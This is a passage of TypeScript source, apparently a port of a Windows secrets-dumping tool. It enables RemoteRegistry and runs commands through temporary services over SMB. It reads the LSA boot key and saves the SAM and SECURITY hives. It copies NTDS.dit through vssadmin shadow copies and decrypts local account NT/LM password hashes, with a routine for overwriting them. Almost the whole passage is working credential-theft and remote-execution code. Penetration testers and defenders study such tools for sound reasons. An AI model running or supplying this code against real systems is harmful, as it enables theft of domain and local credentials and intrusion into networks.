  private async checkServiceStatus(): Promise<void> {
    const ans = await hROpenSCManagerW(this.scmr!) as any;
    this.scManagerHandle = ans.get('lpScHandle');
    const openAns = await hROpenServiceW(this.scmr!, this.scManagerHandle, this.serviceName) as any;
    this.serviceHandle = openAns.get('lpServiceHandle');
    const statusAns = await hRQueryServiceStatus(this.scmr!, this.serviceHandle) as any;

    const currentState = statusAns.get('lpServiceStatus').get('dwCurrentState');
    if (currentState === SERVICE_STOPPED) {
      LOG.info(`Service ${this.serviceName} is in stopped state`);
      this.shouldStop = true;
      this.started = false;
    } else if (currentState === SERVICE_RUNNING) {
      LOG.debug(`Service ${this.serviceName} is already running`);
      this.shouldStop = false;
      this.started = true;
    } else {
      throw new Error(
        `Unknown service state 0x${currentState.toString(16)} - Aborting`,
      );
    }

    if (!this.started) {
      const configAns = await hRQueryServiceConfigW(this.scmr!, this.serviceHandle) as any;
      if (configAns.get('lpServiceConfig').get('dwStartType') === 0x4) {
        LOG.info(`Service ${this.serviceName} is disabled, enabling it`);
        this.disabled = true;
        // hRChangeServiceConfigW(dce, hService, dwServiceType, dwStartType, ...)
        await hRChangeServiceConfigW(
          this.scmr!, this.serviceHandle,
          undefined, // dwServiceType = SERVICE_NO_CHANGE
          0x3,       // dwStartType = manual
        );
      }
      LOG.info(`Starting service ${this.serviceName}`);
      await hRStartServiceW(this.scmr!, this.serviceHandle);
      await sleep(1000);
    }
  }

  async enableRegistry(): Promise<void> {
    await this.connectSvcCtl();
    await this.checkServiceStatus();
    await this.connectWinReg();
  }

  private async restore(): Promise<void> {
    if (this.shouldStop) {
      LOG.info(`Stopping service ${this.serviceName}`);
      await hRControlService(this.scmr!, this.serviceHandle, SERVICE_CONTROL_STOP);
    }
    if (this.disabled) {
      LOG.info(`Restoring the disabled state for service ${this.serviceName}`);
      await hRChangeServiceConfigW(
        this.scmr!, this.serviceHandle,
        undefined, // dwServiceType
        0x4,       // dwStartType = disabled
      );
    }
    if (!this.serviceDeleted && this.tmpServiceName !== null) {
      try {
        const rpc = DCERPCTransportFactory(
          `ncacn_np:${this.smbConnection!.getRemoteHost()}[\\pipe\\svcctl]`,
        );
        const creds = this.smbConnection!.getCredentials();
        rpc.setCredentials(
          creds.user,
          creds.password,
          creds.domain,
          creds.lmhash as string,
          creds.nthash as string,
        );
        rpc.setKerberos(this.doKerberos, this.kdcHost);
        const scmr = rpc.getDceRpc();
        await scmr.connect();
        await scmr.bind(MSRPC_UUID_SCMR);
        const scmAns = await hROpenSCManagerW(scmr) as any;
        const scManagerHandle = scmAns.get('lpScHandle');
        const serviceResp = await hROpenServiceW(scmr, scManagerHandle, this.tmpServiceName) as any;
        const service = serviceResp.get('lpServiceHandle');
        await hRDeleteService(scmr, service);
        try {
          await hRControlService(scmr, service, SERVICE_CONTROL_STOP);
        } catch {
          // Ignore - service may already be stopped
        }
        await hRCloseServiceHandle(scmr, service);
        await hRCloseServiceHandle(scmr, this.serviceHandle);
        await hRCloseServiceHandle(scmr, scManagerHandle);
        await rpc.getDceRpc().disconnect();
      } catch {
        // Ignore cleanup errors
      }
    }
  }

  async finish(): Promise<void> {
    await this.restore();
    if (this.rrp !== null) {
      await this.rrp.disconnect();
    }
    if (this.drsr !== null) {
      await this.drsr.disconnect();
    }
    if (this.samr !== null) {
      await this.samr.disconnect();
    }
    if (this.scmr !== null) {
      try {
        await this.scmr.disconnect();
      } catch (e: unknown) {
        if (!String(e).includes('STATUS_INVALID_PARAMETER')) {
          throw e;
        }
      }
    }
  }

  async getBootKey(): Promise<Buffer> {
    let bootKeyHex = Buffer.alloc(0);
    const ans = await hOpenLocalMachine(this.rrp! as any) as any;
    this.regHandle = ans.get('phKey');

    for (const key of ['JD', 'Skew1', 'GBG', 'Data']) {
      LOG.debug(`Retrieving class info for ${key}`);
      const keyAns = await hBaseRegOpenKey(
        this.rrp! as any,
        this.regHandle,
        `SYSTEM\\CurrentControlSet\\Control\\Lsa\\${key}`,
      ) as any;
      const keyHandle = keyAns.get('phkResult');
      const infoAns = await hBaseRegQueryInfoKey(this.rrp! as any, keyHandle) as any;
      const rawClassOut = infoAns.get('lpClassOut');
      let classOut: string;
      if (typeof rawClassOut === 'string') {
        classOut = rawClassOut.replace(/\0$/, '');
      } else if (rawClassOut && typeof rawClassOut.get === 'function') {
        const inner = rawClassOut.get('Data');
        classOut = (typeof inner === 'string' ? inner : String(inner)).replace(/\0$/, '');
      } else {
        classOut = String(rawClassOut).replace(/\0$/, '');
      }
      bootKeyHex = Buffer.concat([bootKeyHex, Buffer.from(classOut, 'ascii')]);
      await hBaseRegCloseKey(this.rrp! as any, keyHandle);
    }

    const transforms = [8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7];
    const rawBootKey = Buffer.from(bootKeyHex.toString('ascii'), 'hex');

    this.bootKey = Buffer.alloc(rawBootKey.length);
    for (let i = 0; i < rawBootKey.length; i++) {
      this.bootKey[i] = rawBootKey[transforms[i]!]!;
    }

    LOG.info(`Target system bootKey: 0x${this.bootKey.toString('hex')}`);
    return this.bootKey;
  }

  async checkNoLMHashPolicy(): Promise<boolean> {
    LOG.debug('Checking NoLMHash Policy');
    const ans = await hOpenLocalMachine(this.rrp! as any) as any;
    this.regHandle = ans.get('phKey');

    const keyAns = await hBaseRegOpenKey(
      this.rrp! as any,
      this.regHandle,
      'SYSTEM\\CurrentControlSet\\Control\\Lsa',
    ) as any;
    const keyHandle = keyAns.get('phkResult');
    let noLMHash = 0;
    try {
      const [, val] = await hBaseRegQueryValue(this.rrp! as any, keyHandle, 'NoLmHash') as [number, any];
      noLMHash = val;
    } catch {
      noLMHash = 0;
    }

    if (noLMHash !== 1) {
      LOG.debug('LMHashes are being stored');
      return false;
    }
    LOG.debug('LMHashes are NOT being stored');
    return true;
  }

  private async retrieveHive(hiveName: string): Promise<BufferFileIO> {
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    let tmpFileName = '';
    for (let i = 0; i < 8; i++) {
      tmpFileName += chars[Math.floor(Math.random() * chars.length)]!;
    }
    tmpFileName += '.tmp';

    const ans = await hOpenLocalMachine(this.rrp! as any) as any;
    const regHandle = ans.get('phKey');
    let keyHandle: any;
    try {
      const createAns = await hBaseRegCreateKey(this.rrp! as any, regHandle, hiveName) as any;
      keyHandle = createAns.get('phkResult');
    } catch {
      throw new Error(`Can't open ${hiveName} hive`);
    }
    await hBaseRegSaveKey(this.rrp! as any, keyHandle, `..\\Temp\\${tmpFileName}`);
    await hBaseRegCloseKey(this.rrp! as any, keyHandle);
    await hBaseRegCloseKey(this.rrp! as any, regHandle);

    const remoteFile = new RemoteFile(this.smbConnection!, `Temp\\${tmpFileName}`);
    await remoteFile.init();
    await remoteFile.open();
    const data = await remoteFile.readAll();
    await remoteFile.close();
    return new BufferFileIO(data);
  }

  async saveSAM(): Promise<BufferFileIO> {
    LOG.debug('Saving remote SAM database');
    return this.retrieveHive('SAM');
  }

  async saveSECURITY(): Promise<BufferFileIO> {
    LOG.debug('Saving remote SECURITY database');
    return this.retrieveHive('SECURITY');
  }

  private async smbExec(command: string): Promise<void> {
    this.serviceDeleted = false;
    const resp = await hRCreateServiceW(
      this.scmr!,
      this.scManagerHandle,
      this.tmpServiceName!,
      this.tmpServiceName!,
      undefined, // dwDesiredAccess
      undefined, // dwServiceType
      undefined, // dwStartType
      undefined, // dwErrorControl
      command,   // lpBinaryPathName
    ) as any;
    const service = resp.get('lpServiceHandle');
    try {
      await hRStartServiceW(this.scmr!, service);
    } catch {
      // Expected to fail
    }
    await hRDeleteService(this.scmr!, service);
    this.serviceDeleted = true;
    await hRCloseServiceHandle(this.scmr!, service);
  }

  private async executeRemote(data: string): Promise<void> {
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    this.tmpServiceName = '';
    for (let i = 0; i < 8; i++) {
      this.tmpServiceName += chars[Math.floor(Math.random() * chars.length)]!;
    }

    let command =
      `${this.shell}echo ${data} ^> ${this.outputPath} > ${this.batchFile} & ` +
      `${this.shell}${this.batchFile}`;
    command += ` & del ${this.batchFile}`;

    LOG.debug(`ExecuteRemote command: ${command}`);
    if (this.execMethod === 'smbexec') {
      await this.smbExec(command);
    } else {
      throw new Error(`Invalid exec method ${this.execMethod}, aborting`);
    }
  }

  private answer(data: Buffer): void {
    this.answerTMP = Buffer.concat([this.answerTMP, data]);
  }

  private async getLastVSS(forDrive?: string): Promise<[string, string, string]> {
    let command: string;
    if (forDrive) {
      command = `%COMSPEC% /C vssadmin list shadows /for=${forDrive}`;
    } else {
      command = '%COMSPEC% /C vssadmin list shadows';
    }
    await this.executeRemote(command);
    await sleep(5000);

    this.answerTMP = Buffer.alloc(0);
    let tries = 0;
    while (true) {
      try {
        const tid = await this.smbConnection!.connectTree('ADMIN$');
        const fid = await this.smbConnection!.openFile(tid, 'Temp\\__output', FILE_READ_DATA, FILE_SHARE_READ);
        const data = await this.smbConnection!.readFile(tid, fid, 0, null, false);
        this.answer(data);
        await this.smbConnection!.closeFile(tid, fid);
        break;
      } catch (e: unknown) {
        if (tries > 30) {
          throw new Error('Too many tries trying to list vss shadows');
        }
        if (String(e).includes('SHARING')) {
          await sleep(5000);
          tries++;
        } else {
          throw e;
        }
      }
    }

    const lines = this.answerTMP.toString('utf-8').split('\n');
    let lastShadow = '';
    let lastShadowFor = '';
    let lastShadowId = '';

    const SHADOWFOR = 'Volume: (';
    const IDSTART = 'Shadow Copy ID: {';
    const IDLEN = 'xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx'.length;

    for (const line of lines) {
      if (line.includes('GLOBALROOT')) {
        const idx = line.indexOf('\\\\?');
        if (idx >= 0) {
          lastShadow = line.substring(idx).trimEnd();
        }
      } else if (line.includes(SHADOWFOR)) {
        const idx = line.indexOf(SHADOWFOR);
        if (idx >= 0) {
          lastShadowFor = line.substring(idx + SHADOWFOR.length, idx + SHADOWFOR.length + 2);
        }
      } else if (line.includes(IDSTART)) {
        const idx = line.indexOf(IDSTART);
        if (idx >= 0) {
          lastShadowId = line.substring(idx + IDSTART.length, idx + IDSTART.length + IDLEN);
        }
      }
    }

    await this.smbConnection!.deleteFile('ADMIN$', 'Temp\\__output');
    LOG.debug(
      `__getLastVSS found last VSS ${lastShadow} on ${lastShadowFor} with ID of ${lastShadowId}`,
    );
    return [lastShadow, lastShadowFor, lastShadowId];
  }

  async saveNTDS(): Promise<RemoteFile | null> {
    LOG.info('Searching for NTDS.dit');
    try {
      await hOpenLocalMachine(this.rrp! as any);
    } catch {
      return null;
    }

    let keyHandle: any;
    try {
      const ans = await hBaseRegOpenKey(
        this.rrp! as any,
        this.regHandle,
        'SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters',
      ) as any;
      keyHandle = ans.get('phkResult');
    } catch {
      return null;
    }

    let ntdsLocation: string;
    let ntdsDrive: string;
    try {
      const [, dataValue] = await hBaseRegQueryValue(this.rrp! as any, keyHandle, 'DSA Database file') as [number, any];
      ntdsLocation = dataValue.slice(0, -1);
      ntdsDrive = ntdsLocation.substring(0, 2);
    } catch {
      return null;
    }

    await hBaseRegCloseKey(this.rrp! as any, keyHandle);

    LOG.info(
      `Registry says NTDS.dit is at ${ntdsLocation}. Calling vssadmin to get a copy. This might take some time`,
    );
    LOG.info(`Using ${this.execMethod} method for remote execution`);

    let [shadow, shadowFor, shadowId] = await this.getLastVSS(ntdsDrive);
    let shouldRemove = false;

    if (shadow === '' || (shadow !== '' && shadowFor !== ntdsDrive)) {
      await this.executeRemote(`%%COMSPEC%% /C vssadmin create shadow /For=${ntdsDrive}`);
      [shadow, shadowFor, shadowId] = await this.getLastVSS(ntdsDrive);
      shouldRemove = true;
      if (shadow === '' || shadowFor !== ntdsDrive) {
        throw new Error('Could not get a VSS');
      }
    }

    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    let tmpFileName = '';
    for (let i = 0; i < 8; i++) {
      tmpFileName += chars[Math.floor(Math.random() * chars.length)]!;
    }
    tmpFileName += '.tmp';

    await this.executeRemote(
      `%%COMSPEC%% /C copy ${shadow}${ntdsLocation.substring(2)} %%SYSTEMROOT%%\\Temp\\${tmpFileName}`,
    );

    if (shouldRemove) {
      LOG.debug(
        `Trying to delete shadow copy using command : %%COMSPEC%% /C vssadmin delete shadows /shadow="{${shadowId}}" /Quiet`,
      );
      await this.executeRemote(
        `%%COMSPEC%% /C vssadmin delete shadows /shadow="{${shadowId}}" /Quiet`,
      );
    }

    let tries = 0;
    while (true) {
      try {
        await this.smbConnection!.deleteFile('ADMIN$', 'Temp\\__output');
        break;
      } catch (e: unknown) {
        if (tries >= 30) throw e;
        const msg = String(e);
        if (msg.includes('STATUS_OBJECT_NAME_NOT_FOUND') || msg.includes('STATUS_SHARING_VIOLATION')) {
          tries++;
          await sleep(5000);
        } else {
          LOG.error(
            `Cannot delete target file \\\\${this.smbConnection!.getRemoteHost()}\\ADMIN$\\Temp\\__output: ${msg}`,
          );
          break;
        }
      }
    }

    const remoteFileName = new RemoteFile(this.smbConnection!, `Temp\\${tmpFileName}`);
    await remoteFileName.init();
    return remoteFileName;
  }
}

// ---------------------------------------------------------------------------
// CryptoCommon
// ---------------------------------------------------------------------------

export class CryptoCommon {
  deriveKey(baseKey: number): [Buffer, Buffer] {
    const key = Buffer.alloc(4);
    key.writeUInt32LE(baseKey, 0);

    const key1Bytes = Buffer.from([
      key[0]!,
      key[1]!,
      key[2]!,
      key[3]!,
      key[0]!,
      key[1]!,
      key[2]!,
    ]);
    const key2Bytes = Buffer.from([
      key[3]!,
      key[0]!,
      key[1]!,
      key[2]!,
      key[3]!,
      key[0]!,
      key[1]!,
    ]);

    return [transformKey(key1Bytes), transformKey(key2Bytes)];
  }

  static decryptAES(key: Buffer, value: Buffer, iv: Buffer = Buffer.alloc(16)): Buffer {
    const zeroIV = Buffer.alloc(16);
    const isZeroIV = iv.equals(zeroIV);
    let plainText = Buffer.alloc(0);
    let decipher: nodeCrypto.Decipher | null = null;

    if (!isZeroIV) {
      decipher = nodeCrypto.createDecipheriv(
        key.length === 16 ? 'aes-128-cbc' : 'aes-256-cbc',
        key,
        iv,
      );
      decipher.setAutoPadding(false);
    }

    for (let index = 0; index < value.length; index += 16) {
      if (isZeroIV) {
        decipher = nodeCrypto.createDecipheriv(
          key.length === 16 ? 'aes-128-cbc' : 'aes-256-cbc',
          key,
          zeroIV,
        );
        decipher.setAutoPadding(false);
      }
      let cipherBuffer = value.subarray(index, index + 16);
      if (cipherBuffer.length < 16) {
        cipherBuffer = Buffer.concat([cipherBuffer, Buffer.alloc(16 - cipherBuffer.length)]);
      }
      plainText = Buffer.concat([plainText, decipher!.update(cipherBuffer)]);
    }

    return plainText;
  }

  static encryptAES(key: Buffer, value: Buffer, iv: Buffer = Buffer.alloc(16)): Buffer {
    const zeroIV = Buffer.alloc(16);
    const isZeroIV = iv.equals(zeroIV);
    let cipherText = Buffer.alloc(0);

    // PKCS7 padding
    const pad = 16 - (value.length % 16);
    value = Buffer.concat([value, Buffer.alloc(pad, pad)]);

    let cipher: nodeCrypto.Cipher | null = null;
    if (!isZeroIV) {
      cipher = nodeCrypto.createCipheriv(
        key.length === 16 ? 'aes-128-cbc' : 'aes-256-cbc',
        key,
        iv,
      );
      cipher.setAutoPadding(false);
    }

    for (let index = 0; index < value.length; index += 16) {
      if (isZeroIV) {
        cipher = nodeCrypto.createCipheriv(
          key.length === 16 ? 'aes-128-cbc' : 'aes-256-cbc',
          key,
          zeroIV,
        );
        cipher.setAutoPadding(false);
      }
      const plainBuffer = value.subarray(index, index + 16);
      cipherText = Buffer.concat([cipherText, cipher!.update(plainBuffer)]);
    }

    return cipherText;
  }
}

// ---------------------------------------------------------------------------
// OfflineRegistry
// ---------------------------------------------------------------------------

export class OfflineRegistry {
  private hiveFile: any;
  private registryHive: any;

  constructor(hiveFile: any = null, isRemote = false) {
    this.hiveFile = hiveFile;
    if (this.hiveFile !== null) {
      this.registryHive = getRegistryParser(this.hiveFile, isRemote);
    }
  }

  enumKey(searchKey: string): string[] | undefined {
    const parentKey = this.registryHive.findKey(searchKey);
    if (parentKey === null || parentKey === undefined) return undefined;
    return this.registryHive.enumKey(parentKey);
  }

  enumValues(searchKey: string): Buffer[] | undefined {
    const key = this.registryHive.findKey(searchKey);
    if (key === null || key === undefined) return undefined;
    return this.registryHive.enumValues(key);
  }

  getValue(keyValue: string): [number, any] | undefined {
    const value = this.registryHive.getValue(keyValue);
    if (value === null || value === undefined) return undefined;
    return value;
  }

  setValue(keyValue: string, dataValue: any): any {
    const value = this.registryHive.setValue(keyValue, dataValue);
    if (value === null || value === undefined) return undefined;
    return value;
  }

  getClass(className: string): Buffer | undefined {
    const value = this.registryHive.getClass(className);
    if (value === null || value === undefined) return undefined;
    return value;
  }

  finish(): void {
    if (this.hiveFile !== null) {
      this.registryHive.close();
    }
  }
}

// ---------------------------------------------------------------------------
// SAMHashes
// ---------------------------------------------------------------------------

export class SAMHashes extends OfflineRegistry {
  private samFile: any;
  private hashedBootKey = Buffer.alloc(0);
  private _bootKey: Buffer;
  private printUserStatus: boolean;
  private cryptoCommon = new CryptoCommon();
  private itemsFound: Map<number, string> = new Map();
  private perSecretCallback: (secret: string) => void;

  constructor(
    samFile: any,
    bootKey: Buffer,
    isRemote = false,
    printUserStatus = false,
    perSecretCallback: (secret: string) => void = (secret) => _printHelper(secret),
  ) {
    super(samFile, isRemote);
    this.samFile = samFile;
    this._bootKey = bootKey;
    this.printUserStatus = printUserStatus;
    this.perSecretCallback = perSecretCallback;
  }

  binaryToSid(binaryData: Buffer, withoutPrefix = false): string {
    if (binaryData.length < 12) return '';

    if (binaryData.length === 12) {
      if (!withoutPrefix) {
        const rev = binaryData[0]!;
        const authid = binaryData.subarray(2, 8).toString('hex').replace(/^0+/, '');
        const sub = binaryData.readUInt32LE(8);
        return `S-${rev}-${authid}-${sub}`;
      } else {
        const sections: Buffer[] = [];
        for (let i = 0; i < 12; i += 4) {
          const section = Buffer.from(binaryData.subarray(i, i + 4));
          section.reverse();
          sections.push(section);
        }
        const decimals = sections.map((s) => s.readUInt32BE(0));
        return `S-1-5-21-${decimals[0]!}-${decimals[1]!}-${decimals[2]!}`;
      }
    }

    if (binaryData.length > 12) {
      const rev = binaryData[0]!;
      const authid = binaryData.subarray(2, 8).toString('hex').replace(/^0+/, '');
      const sub0 = binaryData.readUInt32LE(8);
      const sub1 = binaryData.readUInt32LE(12);
      const sub2 = binaryData.readUInt32LE(16);
      const sub3 = binaryData.readUInt32LE(20);
      const rid = binaryData.readUInt32LE(24);
      return `S-${rev}-${authid}-${sub0}-${sub1}-${sub2}-${sub3}-${rid}`;
    }

    return '';
  }

  ntTimeToDatetime(ntTime: Buffer): Date {
    const lo = ntTime.readUInt32LE(0);
    const hi = ntTime.readUInt32LE(4);
    const ntTimeInt = BigInt(hi) * BigInt(0x100000000) + BigInt(lo);
    const unixTime = Number((ntTimeInt - BigInt(116444736000000000)) / BigInt(10000000));
    return new Date(unixTime * 1000);
  }

  private md5(data: Buffer): Buffer {
    return nodeCrypto.createHash('md5').update(data).digest();
  }

  getHBootKey(): void {
    LOG.debug('Calculating HashedBootKey from SAM');
    const QWERTY = Buffer.from('!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\0');
    const DIGITS = Buffer.from('0123456789012345678901234567890123456789\0');

    const fVal = this.getValue(ntpathJoin('SAM\\Domains\\Account', 'F'));
    if (!fVal) throw new Error('Cannot read SAM\\Domains\\Account\\F');
    const F = fVal[1];
    const domainData = new DOMAIN_ACCOUNT_F();
    domainData.fromString(F);

    const key0 = domainData.get('Key0') as Buffer;

    if (key0[0] === 0x01) {
      const samKeyData = new SAM_KEY_DATA();
      samKeyData.fromString(key0);

      const rc4Key = this.md5(
        Buffer.concat([
          samKeyData.get('Salt') as Buffer,
          QWERTY,
          this._bootKey,
          DIGITS,
        ]),
      );
      const encrypted = rc4Encrypt(
        rc4Key,
        Buffer.concat([samKeyData.get('Key') as Buffer, samKeyData.get('CheckSum') as Buffer]),
      );
      this.hashedBootKey = Buffer.from(encrypted);

      // Verify checksum
      const checkSum = this.md5(
        Buffer.concat([
          this.hashedBootKey.subarray(0, 16),
          DIGITS,
          this.hashedBootKey.subarray(0, 16),
          QWERTY,
        ]),
      );

      if (!checkSum.equals(this.hashedBootKey.subarray(16))) {
        throw new Error(
          'hashedBootKey CheckSum failed, Syskey startup password probably in use! :(',
        );
      }
    } else if (key0[0] === 0x02) {
      const samKeyData = new SAM_KEY_DATA_AES();
      samKeyData.fromString(key0);
      const dataLen = Number(samKeyData.get('DataLen'));
      this.hashedBootKey = Buffer.from(CryptoCommon.decryptAES(
        this._bootKey,
        (samKeyData.get('Data') as Buffer).subarray(0, dataLen),
        samKeyData.get('Salt') as Buffer,
      ));
    }
  }

  private decryptHash(
    rid: number,
    cryptedHash: any,
    constant: Buffer,
    newStyle = false,
  ): Buffer {
    const [key1, key2] = this.cryptoCommon.deriveKey(rid);

    let key: Buffer;
    if (!newStyle) {
      const ridBuf = Buffer.alloc(4);
      ridBuf.writeUInt32LE(rid, 0);
      const rc4Key = this.md5(
        Buffer.concat([this.hashedBootKey.subarray(0, 0x10), ridBuf, constant]),
      );
      key = rc4Encrypt(rc4Key, cryptedHash.get('Hash') as Buffer);
    } else {
      key = CryptoCommon.decryptAES(
        this.hashedBootKey.subarray(0, 0x10),
        cryptedHash.get('Hash') as Buffer,
        cryptedHash.get('Salt') as Buffer,
      ).subarray(0, 16);
    }

    return Buffer.concat([desEcbDecryptBlock(key1, key.subarray(0, 8)), desEcbDecryptBlock(key2, key.subarray(8, 16))]);
  }

  private encryptHash(
    rid: number,
    plaintextHash: Buffer,
    salt: Buffer,
    constant: Buffer,
    newStyle = false,
  ): Buffer {
    const [key1, key2] = this.cryptoCommon.deriveKey(rid);

    const key = Buffer.concat([
      desEcbEncryptBlock(key1, plaintextHash.subarray(0, 8)),
      desEcbEncryptBlock(key2, plaintextHash.subarray(8, 16)),
    ]);

    if (!newStyle) {
      const ridBuf = Buffer.alloc(4);
      ridBuf.writeUInt32LE(rid, 0);
      const rc4Key = this.md5(
        Buffer.concat([this.hashedBootKey.subarray(0, 0x10), ridBuf, constant]),
      );
      return rc4Encrypt(rc4Key, key);
    } else {
      return CryptoCommon.encryptAES(this.hashedBootKey.subarray(0, 0x10), key, salt);
    }
  }

  private replaceValue(obj: Buffer, offset: number, value: Buffer): Buffer {
    const arr = Buffer.from(obj);
    value.copy(arr, offset);
    return arr;
  }

  dump(): void {
    const NTPASSWORD = Buffer.from('NTPASSWORD\0');
    const LMPASSWORD = Buffer.from('LMPASSWORD\0');

    if (this.samFile === null) return;

    LOG.info('Dumping local SAM hashes (uid:rid:lmhash:nthash)');
    this.getHBootKey();

    const usersKey = 'SAM\\Domains\\Account\\Users';
    let rids = this.enumKey(usersKey);
    if (!rids) return;

    rids = rids.filter((r) => r !== 'Names');

    const fVal = this.getValue(ntpathJoin('SAM\\Domains\\Account', 'F'));
    if (!fVal) return;
    const domainData = new DOMAIN_ACCOUNT_F();
    domainData.fromString(fVal[1]);
    const lockoutThreshold = Number(domainData.get('LockoutThreshold'));
    const lockoutDuration = Number(domainData.get('LockoutDuration'));
    const lockoutDurationMinutes = Math.abs(lockoutDuration) / 10 / 1000000 / 60;

    const vVal = this.getValue(ntpathJoin('SAM\\Domains\\Account', 'V'));
    if (!vVal) return;
    const domainDataV = new DOMAIN_ACCOUNT_V();
    domainDataV.fromString(vVal[1]);
    const systemSid = this.binaryToSid(domainDataV.get('SystemSid') as Buffer, true);

    // Parse groups
    const groupsRoot = 'SAM\\Domains\\Builtin\\Aliases';
    const groups: Map<string, { groupName: string; userCount: number; members: string[] }> =
      new Map();
    const groupEntries = this.enumKey(groupsRoot) ?? [];

    for (const entry of groupEntries) {
      if (!entry.startsWith('00000')) continue;
      const cVal = this.getValue(ntpathJoin(groupsRoot, entry, 'C'));
      if (!cVal) continue;
      const data = cVal[1] as Buffer;
      const groupData = new BUILTIN_GROUP_C();
      groupData.fromString(data);

      const nameOffset = Number(groupData.get('NameOffset'));
      const nameLength = Number(groupData.get('NameLength'));
      const dataField = groupData.get('Data') as Buffer;
      const groupname = dataField.subarray(nameOffset, nameOffset + nameLength).toString('utf16le');
      const userCount = Number(groupData.get('UserCount'));

      const group = { groupName: groupname, userCount, members: [] as string[] };
      groups.set(groupname, group);

      try {
        let newOffset = 0;
        for (let j = 0; j < 500; j++) {
          const offset = Number(groupData.get('UsersOffset')) + 52 + newOffset;
          const entryType = data.readUInt32LE(offset);

          if (entryType === 257 || entryType === 1281) {
            const sidLength = entryType === 257 ? 12 : 28;
            const sid = this.binaryToSid(data.subarray(offset, offset + sidLength));
            group.members.push(sid);
            newOffset += sidLength;
          } else {
            break;
          }
        }
      } catch {
        if (group.members.length === 0) {
          group.members.push('No users in this group');
        }
      }
    }

    const localAdmins: string[] = [];
    for (const group of groups.values()) {
      if (group.groupName === 'Administrators') {
        for (const member of group.members) {
          if (member.trim()) localAdmins.push(member.trim());
        }
      }
    }

    for (const ridStr of rids) {
      let disabled = false;
      let lockedOut = false;
      let autoLocked = false;
      let isAdmin = false;

      const fData = this.getValue(ntpathJoin(usersKey, ridStr, 'F'));
      if (!fData) continue;
      const userAccountF = new USER_ACCOUNT_F();
      userAccountF.fromString(fData[1]);
      const invalidPWDCount = Number(userAccountF.get('InvalidPWDCount'));
      const lastIncorrectPwTimestamp = userAccountF.get('LastIncorrectPasswordTimestamp') as Buffer;
      const lastIncorrectPwDatetime = this.ntTimeToDatetime(lastIncorrectPwTimestamp);
      const userNumber = Number(userAccountF.get('UserNumber'));
      const userSid = `${systemSid}-${userNumber}`;

      isAdmin = localAdmins.includes(userSid);
      let locked = invalidPWDCount >= lockoutThreshold && lockoutThreshold > 0;

      if (locked) {
        const lockoutExpiry = new Date(
          lastIncorrectPwDatetime.getTime() + lockoutDurationMinutes * 60 * 1000,
        );
        locked = new Date() < lockoutExpiry;
      }

      const groupedData = Number(userAccountF.get('GroupedData'));
      disabled = !!(groupedData & 0x0001);
      autoLocked = !!(groupedData & 0x0400);
      lockedOut = locked;

      const vData = this.getValue(ntpathJoin(usersKey, ridStr, 'V'));
      if (!vData) continue;
      const userAccount = new USER_ACCOUNT_V();
      userAccount.fromString(vData[1]);
      const rid = parseInt(ridStr, 16);

      const V = userAccount.get('Data') as Buffer;
      const nameOff = Number(userAccount.get('NameOffset'));
      const nameLen = Number(userAccount.get('NameLength'));
      const userName = V.subarray(nameOff, nameOff + nameLen).toString('utf16le');

      if (Number(userAccount.get('NTHashLength')) === 0) {
        LOG.debug(`The account ${userName} doesn't have hash information.`);
        continue;
      }

      let encNTHash: any = null;
      let encLMHash: any = null;
      let newStyle = false;

      const ntHashOffset = Number(userAccount.get('NTHashOffset'));
      const ntHashSlice = V.subarray(ntHashOffset);
      if (ntHashSlice[2] === 0x01) {
        // Old style hashes
        newStyle = false;
        const lmHashLength = Number(userAccount.get('LMHashLength'));
        const lmHashOffset = Number(userAccount.get('LMHashOffset'));
        if (lmHashLength === 20) {
          encLMHash = new SAM_HASH();
          encLMHash.fromString(V.subarray(lmHashOffset, lmHashOffset + lmHashLength));
        }
        const ntHashLength = Number(userAccount.get('NTHashLength'));
        if (ntHashLength === 20) {
          encNTHash = new SAM_HASH();
          encNTHash.fromString(V.subarray(ntHashOffset, ntHashOffset + ntHashLength));
        }
      } else {
        // New style hashes
        newStyle = true;
        const lmHashLength = Number(userAccount.get('LMHashLength'));
        const lmHashOffset = Number(userAccount.get('LMHashOffset'));
        if (lmHashLength === 24) {
          encLMHash = new SAM_HASH_AES();
          encLMHash.fromString(V.subarray(lmHashOffset, lmHashOffset + lmHashLength));
        }
        const ntHashLength = Number(userAccount.get('NTHashLength'));
        encNTHash = new SAM_HASH_AES();
        encNTHash.fromString(V.subarray(ntHashOffset, ntHashOffset + ntHashLength));
      }

      LOG.debug(`NewStyle hashes is: ${newStyle}`);
      let lmHash: Buffer;
      if (Number(userAccount.get('LMHashLength')) >= 20 && encLMHash) {
        lmHash = this.decryptHash(rid, encLMHash, LMPASSWORD, newStyle);
      } else {
        lmHash = Buffer.alloc(0);
      }

      let ntHash: Buffer;
      if (encNTHash !== null) {
        ntHash = this.decryptHash(rid, encNTHash, NTPASSWORD, newStyle);
      } else {
        ntHash = Buffer.alloc(0);
      }

      if (lmHash.length === 0) lmHash = Buffer.from(lmowfV1('', ''));
      if (ntHash.length === 0) ntHash = Buffer.from(ntowfV1('', ''));

      let answer = `${userName}:${rid}:${lmHash.toString('hex')}:${ntHash.toString('hex')}:::`;

      if (this.printUserStatus) {
        answer = `${answer} (Enabled='${disabled ? 'False' : 'True'}') (Locked='${lockedOut || autoLocked ? 'True' : 'False'}') (Admin='${isAdmin ? 'True' : 'False'}')`;
      }

      this.itemsFound.set(rid, answer);
      this.perSecretCallback(answer);
    }
  }

  edit(user: string, newNTHash: Buffer, newLMHash: Buffer = Buffer.alloc(0)): void {
    const NTPASSWORD = Buffer.from('NTPASSWORD\0');
    const LMPASSWORD = Buffer.from('LMPASSWORD\0');

    if (this.samFile === null) return;

    LOG.info(`Editing local SAM hash for user "${user}"`);
    this.getHBootKey();

    const usersKey = 'SAM\\Domains\\Account\\Users';
    let rids = this.enumKey(usersKey);
    if (!rids) return;
    rids = rids.filter((r) => r !== 'Names');

    for (const ridStr of rids) {
      const vData = this.getValue(ntpathJoin(usersKey, ridStr, 'V'));
      if (!vData) continue;
      const userAccount = new USER_ACCOUNT_V();
      userAccount.fromString(vData[1]);
